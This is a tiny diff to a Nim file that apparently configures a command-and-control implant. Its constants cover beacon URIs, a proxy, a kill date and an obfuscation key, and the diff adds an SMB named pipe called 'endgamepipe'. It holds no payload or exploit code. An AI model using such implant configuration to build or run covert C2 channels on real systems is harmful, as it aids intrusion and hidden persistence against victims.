@@ -8,3 +8,4 @@ const BeaconURIs*  {.strdefine.} = ""
 const ProxyUrl*    {.strdefine.} = ""
 const KillDate*    {.strdefine.} = ""
 const ObfKey*      {.strdefine.} = ""
+const SMBPipe*     {.strdefine.} = "endgamepipe"  # named pipe for smb transport
